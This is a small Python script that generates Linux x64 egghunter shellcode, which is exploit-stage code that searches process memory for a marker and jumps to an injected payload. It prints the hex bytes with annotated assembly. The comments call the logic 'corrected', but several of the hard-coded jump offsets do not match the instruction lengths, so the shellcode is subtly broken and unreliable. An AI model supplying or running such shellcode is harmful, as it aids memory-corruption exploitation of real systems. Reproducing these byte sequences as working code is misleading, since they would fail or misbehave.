import sys

def generate_egghunter(tag="PABA"):
    if len(tag) != 4:
        print("[-] Error: Tag must be exactly 4 characters.")
        return

    # Convert tag to Little-Endian Hex (reverse byte order)
    # Example: PABA (0x50414241) -> "41424150" for the cmp instruction
    tag_bytes = tag.encode()
    tag_hex_le = "".join(reversed([f"{b:02x}" for b in tag_bytes]))

    # Corrected ASM logic for Linux x64 Egghunter using sys_access (0x15)
    # RDI must be used as the address pointer.
    # 
    # _start:
    #   xor rdi, rdi            ; Start address at 0
    # next_page:
    #   or di, 0xfff            ; Skip to end of page (4095)
    # next_addr:
    #   inc rdi                 ; Increment to start of next page (4096) or next byte
    #   push 0x15               ; sys_access (21)
    #   pop rax
    #   syscall                 ; access(rdi, 0)
    #   cmp al, 0xf2            ; Check for EFAULT (bad address)
    #   jz next_page            ; If bad, skip to next page
    #   cmp dword [rdi], TAG    ; Check for first half of egg
    #   jnz next_addr           ; If not match, check next byte
    #   cmp dword [rdi+4], TAG  ; Check for second half
    #   jnz next_addr           ; If not match, check next byte
    #   jmp rdi                 ; Found! Jump to payload
    
    egghunter = (
        "4831ff"            # xor rdi, rdi
        "6681cfff0f"        # next_page: or di, 0xfff
        "48ffc7"            # next_addr: inc rdi
        "6a15"              # push 21
        "58"                # pop rax
        "0f05"              # syscall
        "3cf2"              # cmp al, 0xf2
        "74f1"              # jz next_page (-15 bytes)
        f"813f{tag_hex_le}" # cmp dword [rdi], 0xTAG
        "75f4"              # jnz next_addr (-12 bytes)
        f"817f04{tag_hex_le}" # cmp dword [rdi+4], 0xTAG
        "75eb"              # jnz next_addr (-21 bytes)
        "ffe7"              # jmp rdi
    )
    
    print(f"[*] Egg Tag: {tag} (Double: {tag}{tag})")
    print(f"[*] Egghunter Size: {len(egghunter)//2} bytes")
    print(f"[*] Payload: {egghunter}")
    return egghunter

if __name__ == "__main__":
    generate_egghunter()
